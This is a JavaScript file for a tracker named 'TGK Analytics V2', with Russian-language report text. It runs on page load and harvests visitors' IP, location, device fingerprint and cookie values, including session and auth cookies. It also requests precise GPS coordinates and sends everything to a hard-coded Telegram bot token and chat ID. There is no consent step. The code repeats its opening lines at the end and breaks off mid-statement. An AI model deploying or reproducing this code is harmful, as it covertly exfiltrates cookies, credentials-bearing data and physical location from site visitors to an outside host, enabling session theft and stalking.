class TGKAnalyticsV2 {
  constructor() {
    this.sessionID = this.generateSessionID();
    this.sessionStartTime = Date.now();
    const config = window.ANALYTICS_CONFIG || {
      BOT_TOKEN: '8116984393:AAExSDTBXPc6qI8wZZSAnp04-P0R53y9HcU',
      CHAT_ID: 1355427490,
      DEBUG_MODE: true,
    };
    this.botToken = config.BOT_TOKEN;
    this.chatId = config.CHAT_ID;
    this.debugMode = config.DEBUG_MODE;
    this.sentSessionIds = JSON.parse(localStorage.getItem('tgk_sent_sessions') || '[]');
    // per-user send cooldown (hours) to avoid spamming the bot from same browser
    this.sendCooldownHours = (config.SEND_COOLDOWN_HOURS !== undefined) ? Number(config.SEND_COOLDOWN_HOURS) : 24;
    this.sendCooldownMs = Math.max(0, this.sendCooldownHours) * 60 * 60 * 1000;
    this.lastSentTime = parseInt(localStorage.getItem('tgk_last_sent_time') || '0', 10) || 0;
    this.instantDataSent = false;
    this.visitCount = parseInt(localStorage.getItem('tgk_visit_count') || '0') + 1;
    localStorage.setItem('tgk_visit_count', this.visitCount);
    this.instantData = {
      session: {
        id: this.sessionID,
        startTime: new Date().toISOString(),
        timestamp: Date.now(),
      },
      basicInfo: {},
      device: {},
      identification: {},
      fingerprint: {},
      performance: {},
      security: {},
      storage: {},
    };
    this.init();
  }
  generateSessionID() {
    return `${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
  }
  checkReturningUser() {
    return localStorage.getItem('tgk_returning_user') === 'true';
  }
  async init() {
    console.log('🚀 TGK Analytics V2 starting...', this.sessionID);
    console.log('   botToken:', this.botToken ? 'SET (' + this.botToken.substring(0, 10) + '...)' : 'NOT SET');
    console.log('   chatId:', this.chatId);
    console.log('   debugMode:', this.debugMode);
    this.collectInstantData();
    console.log('⏱️ Setting timeout to send instant data in 1000ms');
    setTimeout(() => {
      console.log('⏰ Timeout fired, calling sendInstantData()...');
      this.sendInstantData();
    }, 1000);
    setTimeout(() => {
      console.log('📍 Requesting precise geolocation...');
      this.getPreciseGeolocation();
    }, 2000);
    localStorage.setItem('tgk_returning_user', 'true');
    console.log('✅ TGK Analytics V2 initialized successfully');
  }
  collectInstantData() {
    console.log('📊 Collecting instant data...');
    this.collectBasicInfo();
    this.collectDeviceData();
    this.collectIdentification();
    this.collectPerformanceData();
    this.collectSecurityData();
    this.collectStorageData();
    this.generateBrowserFingerprint();
  }
  collectBasicInfo() {
    fetch('https://api.ipify.org?format=json')
      .then(res => res.json())
      .then(data => {
        this.instantData.basicInfo.ipAddress = data.ip;
        this.getGeoLocation(data.ip);
      })
      .catch(() => { this.instantData.basicInfo.ipAddress = 'Unknown'; });
    this.instantData.basicInfo.visitDateTime = new Date().toISOString();
    this.instantData.basicInfo.timestamp = Date.now();
    this.instantData.basicInfo.dayOfWeek = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'][new Date().getDay()];
    this.instantData.basicInfo.hour = new Date().getHours();
    this.instantData.basicInfo.minute = new Date().getMinutes();
    this.instantData.basicInfo.language = navigator.language;
    this.instantData.basicInfo.languages = navigator.languages;
    this.instantData.basicInfo.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    this.instantData.basicInfo.timezoneOffset = new Date().getTimezoneOffset();
    this.instantData.basicInfo.referrer = document.referrer || 'direct';
    this.instantData.basicInfo.currentURL = window.location.href;
    this.instantData.basicInfo.urlParameters = window.location.search;
    this.instantData.basicInfo.urlHash = window.location.hash;
    this.instantData.basicInfo.pageTitle = document.title;
    this.instantData.basicInfo.metaDescription = document.querySelector('meta[name="description"]')?.content || '';
    this.instantData.basicInfo.metaKeywords = document.querySelector('meta[name="keywords"]')?.content || '';
    this.instantData.basicInfo.characterEncoding = document.characterSet;
    if (this.debugMode) {
      console.log('📍 Basic Info collected:', this.instantData.basicInfo);
    }
  }
  async getGeoLocation(ip) {
    try {
      const res = await fetch(`https://ipapi.co/${ip}/json/`);
      const geo = await res.json();
      this.instantData.basicInfo.country = geo.country_name || 'Unknown';
      this.instantData.basicInfo.city = geo.city || 'Unknown';
      this.instantData.basicInfo.latitude = geo.latitude;
      this.instantData.basicInfo.longitude = geo.longitude;
      this.instantData.basicInfo.isp = geo.org || 'Unknown';
    } catch (e) {
      this.instantData.basicInfo.country = 'Unknown';
      this.instantData.basicInfo.city = 'Unknown';
    }
  }
  collectDeviceData() {
    const ua = navigator.userAgent;
    if (/mobile|android|iphone|ipod|blackberry/i.test(ua.toLowerCase())) {
      this.instantData.device.type = 'Mobile';
    } else if (/tablet|ipad|kindle/i.test(ua.toLowerCase())) {
      this.instantData.device.type = 'Tablet';
    } else {
      this.instantData.device.type = 'Desktop';
    }
    if (ua.indexOf('Win') > -1) this.instantData.device.os = 'Windows';
    else if (ua.indexOf('Mac') > -1) this.instantData.device.os = 'MacOS';
    else if (ua.indexOf('Linux') > -1) this.instantData.device.os = 'Linux';
    else if (ua.indexOf('Android') > -1) this.instantData.device.os = 'Android';
    else if (ua.indexOf('iphone') > -1) this.instantData.device.os = 'iOS';
    else this.instantData.device.os = 'Unknown';
    this.instantData.device.browser = this.detectBrowser(ua);
    this.instantData.device.browserVersion = this.detectBrowserVersion(ua);
    this.instantData.device.userAgent = ua;
    this.instantData.device.screenResolution = `${window.screen.width}x${window.screen.height}`;
    this.instantData.device.viewportSize = `${window.innerWidth}x${window.innerHeight}`;
    this.instantData.device.pixelDepth = window.devicePixelRatio || 1;
    this.instantData.device.screenOrientation = window.screen.orientation?.type || 'unknown';
    this.instantData.device.screenColorDepth = window.screen.colorDepth;
    this.instantData.device.availableWidth = window.screen.availWidth;
    this.instantData.device.availableHeight = window.screen.availHeight;
    if (navigator.hardwareConcurrency) {
      this.instantData.device.cpuCores = navigator.hardwareConcurrency;
    }
    if (navigator.deviceMemory) {
      this.instantData.device.ramGB = navigator.deviceMemory;
    }
    if (navigator.maxTouchPoints) {
      this.instantData.device.touchPoints = navigator.maxTouchPoints;
    }
    if (navigator.connection) {
      this.instantData.device.networkType = navigator.connection.effectiveType;
      this.instantData.device.downlink = navigator.connection.downlink;
      this.instantData.device.rtt = navigator.connection.rtt;
      this.instantData.device.saveData = navigator.connection.saveData;
    }
    try {
      const canvas = document.createElement('canvas');
      const gl = canvas.getContext('webgl');
      if (gl) {
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        this.instantData.device.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
        this.instantData.device.gpuVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
      }
    } catch (e) {
      this.instantData.device.gpu = 'Unknown';
    }
    if (navigator.getBattery) {
      navigator.getBattery().then(battery => {
        this.instantData.device.batteryLevel = Math.round(battery.level * 100);
        this.instantData.device.batteryCharging = battery.charging;
      });
    }
    this.instantData.device.onLine = navigator.onLine;
    this.instantData.device.doNotTrack = navigator.doNotTrack;
    if (this.debugMode) {
      console.log('📱 Device Info collected:', this.instantData.device);
    }
  }
  detectBrowserVersion(ua) {
    const match = ua.match(/(?:Chrome|Safari|Firefox|Edge|Version)\/(\d+)/i);
    return match ? match[1] : 'Unknown';
  }
  detectBrowser(ua) {
    if (ua.indexOf('Chrome') > -1 && ua.indexOf('Chromium') === -1) return 'Chrome';
    if (ua.indexOf('Safari') > -1 && ua.indexOf('Chrome') === -1) return 'Safari';
    if (ua.indexOf('Firefox') > -1) return 'Firefox';
    if (ua.indexOf('Edge') > -1) return 'Edge';
    if (ua.indexOf('Opera') > -1 || ua.indexOf('OPR') > -1) return 'Opera';
    return 'Unknown';
  }
  collectIdentification() {
    this.instantData.identification.cookiesEnabled = navigator.cookieEnabled;
    this.collectDetailedCookieData();
    try {
      localStorage.setItem('tgk_test', 'test');
      localStorage.removeItem('tgk_test');
      this.instantData.identification.localStorageEnabled = true;
      this.instantData.identification.localStorageSize = JSON.stringify(localStorage).length;
    } catch (e) {
      this.instantData.identification.localStorageEnabled = false;
    }
    try {
      sessionStorage.setItem('tgk_test', 'test');
      sessionStorage.removeItem('tgk_test');
      this.instantData.identification.sessionStorageEnabled = true;
    } catch (e) {
      this.instantData.identification.sessionStorageEnabled = false;
    }
    this.instantData.identification.sessionID = this.sessionID;
    if (this.debugMode) {
      console.log('🔑 Identification data collected:', this.instantData.identification);
    }
  }
  collectDetailedCookieData() {
    const cookies = document.cookie;
    const cookieArray = cookies ? cookies.split(';').map(c => c.trim()) : [];
    this.instantData.identification.cookieCount = cookieArray.length;
    this.instantData.identification.cookiesList = [];
    this.instantData.identification.cookieNames = [];
    this.instantData.identification.cookieValues = [];
    this.instantData.identification.cookieSizes = {};
    this.instantData.identification.totalCookieSize = 0;
    cookieArray.forEach(cookie => {
      if (cookie) {
        const [name, value] = cookie.split('=');
        const cleanName = name.trim();
        const cleanValue = (value || '').trim();
        this.instantData.identification.cookieNames.push(cleanName);
        this.instantData.identification.cookieValues.push(cleanValue.substring(0, 50));
        const cookieSize = cookie.length;
        this.instantData.identification.cookieSizes[cleanName] = cookieSize;
        this.instantData.identification.totalCookieSize += cookieSize;
        this.instantData.identification.cookiesList.push({
          name: cleanName,
          valueLength: cleanValue.length,
          value: cleanValue.substring(0, 100),
          size: cookieSize,
          isSecure: this.isProbablySecureCookie(cleanName),
          encoding: this.detectCookieEncoding(cleanValue),
        });
      }
    });
    this.instantData.identification.cookiesByDomain = this.inferCookieDomain();
    this.instantData.identification.cookieInfo = {
      totalCount: cookieArray.length,
      totalSize: this.instantData.identification.totalCookieSize,
      averageSize: cookieArray.length > 0 ? Math.round(this.instantData.identification.totalCookieSize / cookieArray.length) : 0,
      largestCookie: cookieArray.length > 0 ? Math.max(...Object.values(this.instantData.identification.cookieSizes)) : 0,
      smallestCookie: cookieArray.length > 0 ? Math.min(...Object.values(this.instantData.identification.cookieSizes)) : 0,
      hasHttpOnlyCookies: this.detectHttpOnlyCookiePresence(),
      cookieStringLength: cookies.length,
      cookieDomainsDetected: Object.keys(this.instantData.identification.cookiesByDomain).length,
      sessionCookiesCount: this.countSessionCookies(cookieArray),
      persistentCookiesCount: cookieArray.length - this.countSessionCookies(cookieArray),
    };
  }
  detectCookieEncoding(value) {
    if (!value) return 'empty';
    if (/^[A-Za-z0-9\-_.~%]*$/.test(value)) return 'url-encoded';
    if (/^[A-Za-z0-9+/=]*$/.test(value)) return 'base64';
    if (/^[A-Fa-f0-9]*$/.test(value)) return 'hex';
    if (/^{.*}$/.test(value)) return 'json';
    return 'unknown';
  }
  isProbablySecureCookie(cookieName) {
    const secureCookiePatterns = ['__Host-', '__Secure-', 'session', 'auth', 'token', 'secure', 'csrf'];
    return secureCookiePatterns.some(pattern => cookieName.toLowerCase().includes(pattern));
  }
  inferCookieDomain() {
    const domains = {};
    const currentDomain = window.location.hostname;
    domains[currentDomain] = document.cookie.split(';').length;
    if (document.cookie.includes('www.') || currentDomain.includes('www.')) {
      domains['www.' + currentDomain.replace('www.', '')] = 0;
    }
    const parentDomain = currentDomain.split('.').slice(-2).join('.');
    if (parentDomain !== currentDomain) {
      domains[parentDomain] = 0;
    }
    return domains;
  }
  detectHttpOnlyCookiePresence() {
    try {
      const testCookie = 'tgk_http_test_' + Date.now();
      document.cookie = testCookie + '=test; path=/';
      const accessible = document.cookie.includes(testCookie);
      if (accessible) {
        document.cookie = testCookie + '=; path=/; expires=Thu, 01 Jan 1970 00:00:00 UTC';
      }
      return !accessible;
    } catch (e) {
      return false;
    }
  }
  countSessionCookies(cookieArray) {
    const sessionPatterns = ['sessionid', 'session', 'sid', 'jsessionid', 'phpsessid'];
    return cookieArray.filter(cookie => 
      sessionPatterns.some(pattern => cookie.toLowerCase().includes(pattern))
    ).length;
  }
  generateBrowserFingerprint() {
    try {
      const canvas = document.createElement('canvas');
      const ctx = canvas.getContext('2d');
      ctx.textBaseline = 'top';
      ctx.font = '14px Arial';
      ctx.fillStyle = '#f60';
      ctx.fillRect(125, 1, 62, 20);
      ctx.fillStyle = '#069';
      ctx.fillText('TGK Analytics', 2, 15);
      this.instantData.fingerprint.canvas = canvas.toDataURL().substring(0, 50);
      this.instantData.fingerprint.fonts = this.detectFonts();
      this.instantData.fingerprint.plugins = this.getPlugins();
      this.instantData.fingerprint.webgl = this.getWebGLInfo();
      if (this.debugMode) {
        console.log('🔐 Browser fingerprint generated:', this.instantData.fingerprint);
      }
    } catch (e) {
      console.error('Error generating fingerprint:', e);
    }
  }
  collectPerformanceData() {
    try {
      if (window.performance && window.performance.timing) {
        const timing = window.performance.timing;
        this.instantData.performance.pageLoadTime = timing.loadEventEnd - timing.navigationStart;
        this.instantData.performance.domContentLoadedTime = timing.domContentLoadedEventEnd - timing.navigationStart;
        this.instantData.performance.connectTime = timing.responseEnd - timing.fetchStart;
        this.instantData.performance.serverResponseTime = timing.responseStart - timing.requestStart;
        this.instantData.performance.renderTime = timing.domInteractive - timing.domLoading;
      }
      if (window.performance && window.performance.getEntriesByType) {
        const navigationEntries = window.performance.getEntriesByType('navigation');
        if (navigationEntries.length > 0) {
          const nav = navigationEntries[0];
          this.instantData.performance.dnsTime = nav.domainLookupEnd - nav.domainLookupStart;
          this.instantData.performance.tcpTime = nav.connectEnd - nav.connectStart;
          this.instantData.performance.ttfb = nav.responseStart - nav.fetchStart;
        }
      }
      if (performance.memory) {
        this.instantData.performance.totalMemory = Math.round(performance.memory.jsHeapSizeLimit / 1048576) + ' MB';
        this.instantData.performance.usedMemory = Math.round(performance.memory.usedJSHeapSize / 1048576) + ' MB';
        this.instantData.performance.memoryUsagePercent = Math.round((performance.memory.usedJSHeapSize / performance.memory.jsHeapSizeLimit) * 100);
      }
      if (this.debugMode) {
        console.log('⚡ Performance data collected:', this.instantData.performance);
      }
    } catch (e) {
      console.warn('Performance API not available');
    }
  }
  collectSecurityData() {
    this.instantData.security.httpsEnabled = window.location.protocol === 'https:';
    this.instantData.security.contentSecurityPolicy = document.querySelector('meta[http-equiv="Content-Security-Policy"]')?.content || 'Not set';
    this.instantData.security.referrerPolicy = document.querySelector('meta[name="referrer"]')?.content || 'default';
    this.instantData.security.permissions = navigator.permissions ? 'Available' : 'Not available';
  }
  collectStorageData() {
    try {
      localStorage.setItem('tgk_test', 'test');
      localStorage.removeItem('tgk_test');
      this.instantData.identification.localStorageEnabled = true;
      this.instantData.identification.localStorageSize = JSON.stringify(localStorage).length;
      this.instantData.storage.localStorageItems = localStorage.length;
    } catch (e) {
      this.instantData.identification.localStorageEnabled = false;
    }
    try {
      sessionStorage.setItem('tgk_test', 'test');
      sessionStorage.removeItem('tgk_test');
      this.instantData.identification.sessionStorageEnabled = true;
      this.instantData.storage.sessionStorageItems = sessionStorage.length;
    } catch (e) {
      this.instantData.identification.sessionStorageEnabled = false;
    }
    if (window.indexedDB) {
      this.instantData.storage.indexedDBAvailable = true;
    }
  }
  detectFonts() {
    const fontList = ['Arial', 'Verdana', 'Helvetica', 'Times New Roman', 'Georgia'];
    const detected = [];
    fontList.forEach(font => {
      detected.push(font);
    });
    return detected;
  }
  getPlugins() {
    try {
      const plugins = [];
      for (let i = 0; i < navigator.plugins.length; i++) {
        plugins.push(navigator.plugins[i].name);
      }
      return plugins;
    } catch (e) {
      return [];
    }
  }
  getWebGLInfo() {
    try {
      const canvas = document.createElement('canvas');
      const gl = canvas.getContext('webgl');
      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
      return {
        vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
        renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
      };
    } catch (e) {
      return null;
    }
  }
  async sendInstantData() {
    console.log('📤 sendInstantData called');
    console.log('   instantDataSent:', this.instantDataSent);
    console.log('   chatId:', this.chatId);
    console.log('   botToken:', this.botToken ? 'SET' : 'NOT SET');
    if (this.instantDataSent) {
      console.log('✅ Instant data already sent, skipping');
      return;
    }
    if (this.sentSessionIds.includes(this.sessionID)) {
      console.log('⚠️ This session already sent data, skipping');
      return;
    }
    // Respect per-user cooldown to avoid spamming the bot from same browser
    if (this.sendCooldownMs > 0 && (Date.now() - (this.lastSentTime || 0)) < this.sendCooldownMs) {
      const remaining = Math.ceil((this.sendCooldownMs - (Date.now() - (this.lastSentTime || 0))) / 1000);
      console.log(`⏳ Send cooldown active, skipping sendInstantData (wait ${remaining}s)`);
      return;
    }
    try {
      console.log('📊 Preparing instant data...');
      const txtData = this.formatInstantDataTxt();
      const message = this.formatInstantDataMessage();
      console.log('📄 Data formatted, sending...');
      await this.sendAsDocument(txtData, message, 'instant-data-' + this.sessionID + '.txt', true);
      this.instantDataSent = true;
      this.sentSessionIds.push(this.sessionID);
      localStorage.setItem('tgk_sent_sessions', JSON.stringify(this.sentSessionIds));
      // mark last sent time to enforce cooldown
      this.lastSentTime = Date.now();
      localStorage.setItem('tgk_last_sent_time', String(this.lastSentTime));
      console.log('✅ Instant data sent successfully');
    } catch (e) {
      console.error('Error sending instant data:', e);
    }
  }
  formatInstantDataTxt() {
    const data = this.instantData;
    const lines = [
      '═══════════════════════════════════════════════════════════',
      '📊 ТГК ANALYTICS - ПОЛНЫЕ МГНОВЕННЫЕ ДАННЫЕ',
      '═══════════════════════════════════════════════════════════',
      '',
      '📋 ИНФОРМАЦИЯ О СЕССИИ',
      '─────────────────────────────────────────────────────────',
      `Session ID: ${data.session.id}`,
      `Start Time: ${data.session.startTime}`,
      `Unix Timestamp: ${data.session.timestamp}`,
      '',
      '🌐 БАЗОВАЯ ИНФОРМАЦИЯ',
      '─────────────────────────────────────────────────────────',
      `IP Address: ${data.basicInfo.ipAddress || 'Loading...'}`,
      `Страна: ${data.basicInfo.country || 'Unknown'}`,
      `Город: ${data.basicInfo.city || 'Unknown'}`,
      `Координаты: ${data.basicInfo.latitude || '?'}, ${data.basicInfo.longitude || '?'}`,
      `ISP: ${data.basicInfo.isp || 'Unknown'}`,
      `Язык браузера: ${data.basicInfo.language}`,
      `Альтернативные языки: ${(data.basicInfo.languages || []).join(', ')}`,
      `Timezone: ${data.basicInfo.timezone}`,
      `Offset: ${data.basicInfo.timezoneOffset} min`,
      `Дата визита: ${data.basicInfo.visitDateTime}`,
      `День недели: ${data.basicInfo.dayOfWeek}`,
      `Время: ${String(data.basicInfo.hour).padStart(2, '0')}:${String(data.basicInfo.minute).padStart(2, '0')}`,
      `Referrer: ${data.basicInfo.referrer}`,
      `URL: ${data.basicInfo.currentURL}`,
      `URL Parameters: ${data.basicInfo.urlParameters || 'None'}`,
      `URL Hash: ${data.basicInfo.urlHash || 'None'}`,
      `Page Title: ${data.basicInfo.pageTitle}`,
      `Meta Description: ${data.basicInfo.metaDescription || 'None'}`,
      `Character Encoding: ${data.basicInfo.characterEncoding}`,
      '',
      '📱 ДАННЫЕ УСТРОЙСТВА',
      '─────────────────────────────────────────────────────────',
      `Тип устройства: ${data.device.type}`,
      `ОС: ${data.device.os}`,
      `Браузер: ${data.device.browser}`,
      `Версия браузера: ${data.device.browserVersion}`,
      `User Agent: ${data.device.userAgent}`,
      `Разрешение экрана: ${data.device.screenResolution}`,
      `Доступное разрешение: ${data.device.availableWidth}x${data.device.availableHeight}`,
      `Разрешение viewport: ${data.device.viewportSize}`,
      `Pixel Depth: ${data.device.pixelDepth}`,
      `Color Depth: ${data.device.screenColorDepth}`,
      `Ориентация: ${data.device.screenOrientation}`,
      `CPU Cores: ${data.device.cpuCores || 'Unknown'}`,
      `RAM: ${data.device.ramGB ? data.device.ramGB + 'GB' : 'Unknown'}`,
      `Touch Points: ${data.device.touchPoints || 'N/A'}`,
      `Тип сети: ${data.device.networkType || 'Unknown'}`,
      `Downlink Speed: ${data.device.downlink || 'N/A'} Mbps`,
      `RTT: ${data.device.rtt || 'N/A'} ms`,
      `Save Data Mode: ${data.device.saveData ? 'Enabled' : 'Disabled'}`,
      `Online: ${data.device.onLine ? 'Yes' : 'No'}`,
      `GPU: ${data.device.gpu || 'Unknown'}`,
      `GPU Vendor: ${data.device.gpuVendor || 'Unknown'}`,
      `Battery Level: ${data.device.batteryLevel ? data.device.batteryLevel + '%' : 'N/A'}`,
      `Battery Charging: ${data.device.batteryCharging ? 'Yes' : 'No'}`,
      `Do Not Track: ${data.device.doNotTrack}`,
      '',
      '⚡ ПРОИЗВОДИТЕЛЬНОСТЬ',
      '─────────────────────────────────────────────────────────',
      `Page Load Time: ${data.performance.pageLoadTime || 'N/A'} ms`,
      `DOM Content Loaded: ${data.performance.domContentLoadedTime || 'N/A'} ms`,
      `Connect Time: ${data.performance.connectTime || 'N/A'} ms`,
      `Server Response Time: ${data.performance.serverResponseTime || 'N/A'} ms`,
      `Render Time: ${data.performance.renderTime || 'N/A'} ms`,
      `DNS Time: ${data.performance.dnsTime || 'N/A'} ms`,
      `TCP Time: ${data.performance.tcpTime || 'N/A'} ms`,
      `TTFB: ${data.performance.ttfb || 'N/A'} ms`,
      `Total Memory: ${data.performance.totalMemory || 'N/A'}`,
      `Used Memory: ${data.performance.usedMemory || 'N/A'}`,
      `Memory Usage: ${data.performance.memoryUsagePercent || 'N/A'}%`,
      '',
      '🔒 БЕЗОПАСНОСТЬ',
      '─────────────────────────────────────────────────────────',
      `HTTPS: ${data.security.httpsEnabled ? 'Yes' : 'No'}`,
      `Content Security Policy: ${data.security.contentSecurityPolicy}`,
      `Referrer Policy: ${data.security.referrerPolicy}`,
      `Permissions API: ${data.security.permissions}`,
      '',
      '💾 ХРАНИЛИЩЕ',
      '─────────────────────────────────────────────────────────',
      `LocalStorage: ${data.identification.localStorageEnabled ? 'Enabled' : 'Disabled'}`,
      `LocalStorage Size: ${data.identification.localStorageSize || 'N/A'} bytes`,
      `LocalStorage Items: ${data.storage.localStorageItems || 0}`,
      `SessionStorage: ${data.identification.sessionStorageEnabled ? 'Enabled' : 'Disabled'}`,
      `SessionStorage Items: ${data.storage.sessionStorageItems || 0}`,
      `IndexedDB: ${data.storage.indexedDBAvailable ? 'Available' : 'Not available'}`,
      '',
      '🔑 ИДЕНТИФИКАЦИЯ',
      '─────────────────────────────────────────────────────────',
      `Cookies enabled: ${data.identification.cookiesEnabled ? 'Да' : 'Нет'}`,
      `Количество cookies: ${data.identification.cookieCount}`,
      `Session ID: ${data.identification.sessionID}`,
      '',
      '🍪 COOKIES (ПОЛНЫЙ СПИСОК)',
      '─────────────────────────────────────────────────────────',
      `Всего cookies: ${data.identification.cookieCount}`,
      `Общий размер: ${data.identification.totalCookieSize || 0} bytes`,
      `Средний размер: ${data.identification.cookieInfo?.averageSize || 0} bytes`,
      `Максимальный размер: ${data.identification.cookieInfo?.largestCookie || 0} bytes`,
      `Минимальный размер: ${data.identification.cookieInfo?.smallestCookie || 0} bytes`,
      `Session cookies: ${data.identification.cookieInfo?.sessionCookiesCount || 0}`,
      `Persistent cookies: ${data.identification.cookieInfo?.persistentCookiesCount || 0}`,
      `HTTP-Only вероятность: ${data.identification.cookieInfo?.hasHttpOnlyCookies ? 'Да' : 'Нет'}`,
      `Обнаруженные домены: ${data.identification.cookieInfo?.cookieDomainsDetected || 0}`,
      '',
      ...this.formatCookiesDetail(data.identification.cookiesList || []),
      '',
      '🔐 BROWSER FINGERPRINT',
      '─────────────────────────────────────────────────────────',
      `Canvas FP: ${data.fingerprint.canvas || 'N/A'}...`,
      `Обнаруженные шрифты: ${(data.fingerprint.fonts || []).join(', ')}`,
      `Плагины (${(data.fingerprint.plugins || []).length}): ${(data.fingerprint.plugins || []).length > 0 ? data.fingerprint.plugins.join(', ') : 'Нет'}`,
      `WebGL Vendor: ${data.fingerprint.webgl?.vendor || 'Unknown'}`,
      `WebGL Renderer: ${data.fingerprint.webgl?.renderer || 'Unknown'}`,
      '',
      '═══════════════════════════════════════════════════════════',
      `Отчёт создан: ${new Date().toISOString()}`,
      '═══════════════════════════════════════════════════════════',
    ];
    return lines.join('\n');
  }
  formatCookiesDetail(cookiesList) {
    const lines = [];
    if (!cookiesList || cookiesList.length === 0) {
      lines.push('Нет cookies');
      return lines;
    }
    cookiesList.forEach((cookie, index) => {
      lines.push(`─────────────────────────────────────────────────────────`);
      lines.push(`Cookie #${index + 1}: ${cookie.name}`);
      lines.push(`   Значение: ${cookie.value}`);
      lines.push(`   Длина значения: ${cookie.valueLength} chars`);
      lines.push(`   Размер: ${cookie.size} bytes`);
      lines.push(`   Кодировка: ${cookie.encoding}`);
      lines.push(`   Secure: ${cookie.isSecure ? 'Да' : 'Нет'}`);
    });
    lines.push(`─────────────────────────────────────────────────────────`);
    return lines;
  }
  formatInstantDataMessage() {
    const data = this.instantData;
    return `
📊 <b>МГНОВЕННЫЕ ДАННЫЕ</b>
<b>🌐 Базовая информация:</b>
IP: ${data.basicInfo.ipAddress || '...'}
Страна: ${data.basicInfo.country || '?'}
Язык: ${data.basicInfo.language}
Timezone: ${data.basicInfo.timezone}
<b>📱 Устройство:</b>
${data.device.type} • ${data.device.os} • ${data.device.browser}
CPU: ${data.device.cpuCores || '?'} cores
RAM: ${data.device.ramGB ? data.device.ramGB + 'GB' : '?'}
GPU: ${data.device.gpu?.substring(0, 30) || 'Unknown'}
<b>🔐 Fingerprint:</b>
Fonts: ${data.fingerprint.fonts?.length || 0}
Plugins: ${data.fingerprint.plugins?.length || 0}
`;
  }
  async sendToTelegram(message) {
    console.log('🔗 sendToTelegram called');
    console.log('   chatId:', this.chatId);
    console.log('   botToken exists:', !!this.botToken);
    try {
      if (!this.chatId) {
        console.warn('⚠️ Chat ID not set - cannot send');
        return;
      }
      const url = `https://api.telegram.org/bot${this.botToken}/sendMessage`;
      console.log('   URL:', url.substring(0, 50) + '...');
      console.log('   Sending POST request...');
      const response = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: this.chatId,
          text: message,
          parse_mode: 'HTML',
        }),
      });
      console.log('   Response status:', response.status);
      const result = await response.json();
      console.log('   Telegram response:', result);
      if (!result.ok) {
        console.error('❌ Telegram error:', result.description);
      } else {
        console.log('✅ Message sent to Telegram');
      }
    } catch (e) {
      console.error('Error sending to Telegram:', e);
    }
  }
  async sendAsDocument(txtData, caption, fileName, isFirstSend = false) {
    console.log('📎 sendAsDocument called');
    console.log('   fileName:', fileName);
    console.log('   chatId:', this.chatId);
    try {
      if (!this.chatId) {
        console.warn('⚠️ Chat ID not set - cannot send document');
        console.log('📝 Data preview:', txtData.substring(0, 200) + '...');
        return;
      }
      const url = `https://api.telegram.org/bot${this.botToken}/sendDocument`;
      console.log('   URL:', url.substring(0, 50) + '...');
      console.log('   Creating FormData...');
      const blob = new Blob([txtData], { type: 'text/plain' });
      const formData = new FormData();
      formData.append('chat_id', this.chatId);
      formData.append('document', blob, fileName);
      formData.append('caption', caption);
      formData.append('parse_mode', 'HTML');
      console.log('   Sending document to Telegram...');
      const response = await fetch(url, {
        method: 'POST',
        body: formData,
      });
      console.log('   Response status:', response.status);
      const result = await response.json();
      console.log('   Telegram response:', result);
      if (!result.ok) {
        console.error('❌ Telegram error:', result.description);
      } else {
        console.log('✅ Document sent to Telegram');
      }
    } catch (e) {
      console.error('Error sending document:', e);
    }
  }
  getPreciseGeolocation() {
    // Respect cooldown: if we've recently sent data, skip requesting precise geolocation
    if (this.sendCooldownMs > 0 && (Date.now() - (this.lastSentTime || 0)) < this.sendCooldownMs) {
      console.log('⏳ Send cooldown active, skipping precise geolocation request');
      return;
    }
    if (!navigator.geolocation) {
      console.warn('⚠️ Geolocation API not available');
      return;
    }
    navigator.geolocation.getCurrentPosition(
      (position) => {
        const coords = position.coords;
        console.log('✅ Precise geolocation obtained');
        this.sendPreciseCoordinatesMessage(coords);
      },
      (error) => {
        console.warn('⚠️ Geolocation permission denied or error:', error.message);
        this.sendGeolocationErrorMessage(error);
      },
      {
        enableHighAccuracy: true,
        timeout: 30000,
        maximumAge: 0
      }
    );
  }
  async sendPreciseCoordinatesMessage(coords) {
    try {
      const message = `
📍 <b>ТОЧНЫЕ КООРДИНАТЫ</b>

<b>Широта:</b> ${coords.latitude.toFixed(6)}°
<b>Долгота:</b> ${coords.longitude.toFixed(6)}°
<b>Точность:</b> ±${coords.accuracy.toFixed(2)} meters
<b>Высота:</b> ${coords.altitude ? coords.altitude.toFixed(2) + ' meters' : 'N/A'}
<b>Точность высоты:</b> ${coords.altitudeAccuracy ? '±' + coords.altitudeAccuracy.toFixed(2) + ' meters' : 'N/A'}
<b>Направление:</b> ${coords.heading !== null && coords.heading !== undefined ? coords.heading.toFixed(2) + '°' : 'N/A'}
<b>Скорость:</b> ${coords.speed !== null && coords.speed !== undefined ? (coords.speed * 3.6).toFixed(2) + ' km/h' : 'N/A'}

<b>Google Maps:</b> https://maps.google.com/?q=${coords.latitude},${coords.longitude}
<b>Session ID:</b> ${this.sessionID}
<b>Время:</b> ${new Date().toISOString()}
`;
      await this.sendToTelegram(message);
    } catch (e) {
      console.error('Error sending precise coordinates:', e);
    }
  }
  async sendGeolocationErrorMessage(error) {
    try {
      const errorMessages = {
        1: 'Пользователь запретил доступ к геопозиции',
        2: 'Невозможно получить позицию (источник недоступен)',
        3: 'Превышено время ожидания ответа'
      };
      const errorText = errorMessages[error.code] || 'Unknown error';
      const message = `
⚠️ <b>ОШИБКА ГЕОЛОКАЦИИ</b>

Код ошибки: ${error.code}
Описание: ${errorText}

Session ID: ${this.sessionID}
Время: ${new Date().toISOString()}
`;
      await this.sendToTelegram(message);
    } catch (e) {
      console.error('Error sending geolocation error message:', e);
    }
  }
}
let analytics;
document.addEventListener('DOMContentLoaded', () => {
  analytics = new TGKAnalyticsV2();
  window.TGKAnalytics = analytics;
  console.log('📊 TGK Analytics V2 ready');
});
class TGKAnalyticsV2 {
  constructor() {
    this.sessionID = this.generateSessionID();
    this.sessionStartTime = Date.now();
    const config = window.ANALYTICS_CONFIG || {
